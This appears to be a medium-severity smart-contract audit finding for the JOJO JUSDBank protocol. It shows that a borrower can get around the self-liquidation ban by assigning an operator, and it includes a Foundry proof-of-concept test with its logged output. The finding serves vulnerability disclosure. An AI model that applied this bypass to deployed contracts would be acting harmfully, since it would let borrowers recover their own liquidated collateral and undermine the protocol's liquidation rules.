0xbepresent

medium

# A liquidated user can assign an operator, then the operator can liquidates him on behalf his client (the user who assigned him as operator), bypassing the `SELF_LIQUIDATION_NOT_ALLOWED` restriction

## Summary

The liquidated user can assign an operator, then the operator can liquidate on behalf of the user who assigned him as operator. The liquidated user can get his own liquidated collateral.

## Vulnerability Detail

There is a validation by the [isValidLiquidator()](https://github.com/sherlock-audit/2023-04-jojo/blob/main/JUSDV1/src/Impl/JUSDBank.sol#L365) function where it checks the liquidated address must not be the liquidator address in the 366 code line. So the liquidated address can not be the liquidator.

```solidity
File: JUSDBank.sol
365:     function isValidLiquidator(address liquidated, address liquidator) internal view {
366:         require(
367:             liquidator != liquidated,
368:             JUSDErrors.SELF_LIQUIDATION_NOT_ALLOWED
369:         );
370:         if(isLiquidatorWhitelistOpen){
371:             require(isLiquidatorWhiteList[liquidator], JUSDErrors.LIQUIDATOR_NOT_IN_THE_WHITELIST);
372:         }
373:     }
```

The problem is that the liquidated address can assign an operator, then the operator can liquidate on behalf the liquidated address.

I created the next test:

1. Alice deposit 10e18 mockToken1 and borrow 742e6 JUSD
2. Alice can be liquidated because the collateral price is updated
3. Alice tries to liquidate herself but the transaction is reverted by "SELF_LIQUIDATION_NOT_ALLOWED"
4. Alice assigns the operator "Jim".
5. Now Jim can liquidate Alice causing to Alice to get the collateral USDC. This bypass the restriction "SELF_LIQUIDATION_NOT_ALLOWED"

```solidity
File: JUSDBankLiquidateCollateral.t.sol
200:     function testSelfLiquidationViaOperator() public {
201:         // Self liquidation via the client's assigned operator
202:         // 1. Alice deposit 10e18 mockToken1 and borrow 742e6 JUSD
203:         // 2. Alice can be liquidated because the collateral price is updated
204:         // 3. Alice tries to liquidate herself but the transaction is reverted by "SELF_LIQUIDATION_NOT_ALLOWED"
205:         // 4. Alice assigns the operator "Jim".
206:         // 5. Now Jim can liquidate Alice causing to Alice to get the collateral USDC. This bypass the restriction "SELF_LIQUIDATION_NOT_ALLOWED"
207:         //
208:         // 1. Alice deposit 10e18 mockToken1 and borrow 742e6 JUSD
209:         //
210:         mockToken1.transfer(alice, 10e18);
211:         vm.startPrank(alice);
212:         mockToken1.approve(address(jusdBank), 10e18);
213:         jusdBank.deposit(alice, address(mockToken1), 10e18, alice);
214:         jusdBank.borrow(7426e6, alice, false);
215:         vm.stopPrank();
216:         //
217:         // 2. Alice can be liquidated because the collateral price is updated
218:         //
219:         MockChainLink900 eth900 = new MockChainLink900();
220:         JOJOOracleAdaptor jojoOracle900 = new JOJOOracleAdaptor(
221:             address(eth900),//source
222:             20,//decimal correction
223:             86400,//heartBeat
224:             address(usdcPrice)//USDSource
225:         );
226:         jusdBank.updateOracle(address(mockToken1), address(jojoOracle900));
227:         swapContract.addTokenPrice(address(mockToken1), address(jojoOracle900));
228:         FlashLoanLiquidate flashLoanLiquidate = new FlashLoanLiquidate(
229:             address(jusdBank),
230:             address(jusdExchange),
231:             address(USDC),
232:             address(jusd),
233:             insurance
234:         );
235:         bytes memory data = swapContract.getSwapData(
236:             10e18,
237:             address(mockToken1)
238:         );
239:         bytes memory param = abi.encode(
240:             swapContract,//approveTarget
241:             swapContract,//swapTarget
242:             address(alice),//liquidator
243:             data//data
244:         );
245:         vm.startPrank(alice);
246:         bytes memory afterParam = abi.encode(
247:             address(flashLoanLiquidate),
248:             param
249:         );
250:         //
251:         // 3. Alice tries to liquidate herself but the transaction is reverted by "SELF_LIQUIDATION_NOT_ALLOWED"
252:         //
253:         cheats.expectRevert("SELF_LIQUIDATION_NOT_ALLOWED");
254:         jusdBank.liquidate(
255:             alice, // Liquidated
256:             address(mockToken1),  //collateral used
257:             alice, //liquidator
258:             10e18, //10e18 amount
259:             afterParam,
260:             10e18 //expectedPrice
261:         );
262:         //
263:         // 4. Alice assigns the operator "Jim".
264:         //
265:         jusdBank.setOperator(jim, true);
266:         vm.stopPrank();
267:         console.log("Alice balance JUSD before liquidation:", IERC20(jusd).balanceOf(address(alice)));
268:         console.log("Alice balance USDC before liquidation:", IERC20(USDC).balanceOf(address(alice)));
269:         //
270:         // 5. Now Jim can liquidate Alice causing to Alice to get the collateral USDC. This bypass the restriction "SELF_LIQUIDATION_NOT_ALLOWED"
271:         //
272:         // Now Jim can liquidate his client Alice
273:         vm.startPrank(jim);
274:         jusdBank.liquidate(
275:             alice, // Liquidated
276:             address(mockToken1),  // collateral used
277:             jim, // liquidator Jim
278:             10e18, //10e18 amount
279:             afterParam,
280:             10e18 //expectedPrice
281:         );
282:         console.log("");
283:         console.log("Alice balance JUSD after liquidation: ", IERC20(jusd).balanceOf(address(alice)));
284:         console.log("Alice balance USDC after liquidation: ", IERC20(USDC).balanceOf(address(alice)));
285:     }
```

Output:

```bash
Running 1 test for test/Impl/JUSDBankLiquidateCollateral.t.sol:JUSDBankLiquidateCollateralTest
[PASS] testSelfLiquidationViaOperator() (gas: 1782422)
Logs:
  Alice balance JUSD before liquidation: 7426000000
  Alice balance USDC before liquidation: 0
  
  Alice balance JUSD after liquidation:  7426000000
  Alice balance USDC after liquidation:  748888889
```

## Impact

The liquidated user can get his own liquidated collateral, so the [SELF_LIQUIDATION_NOT_ALLOWED](https://github.com/sherlock-audit/2023-04-jojo/blob/main/JUSDV1/src/Impl/JUSDBank.sol#L366-L369) restriction is bypassed.

## Code Snippet

- The [JUSDBank.liquidate()](https://github.com/sherlock-audit/2023-04-jojo/blob/main/JUSDV1/src/Impl/JUSDBank.sol#L143) function
- The [JUSDBank.isValidLiquidator()](https://github.com/sherlock-audit/2023-04-jojo/blob/main/JUSDV1/src/Impl/JUSDBank.sol#L365) function.

## Tool used

Manual review

## Recommendation

If the liquidated address assigns an operator, don't let the operator to liquidates the user who assigned him as operator.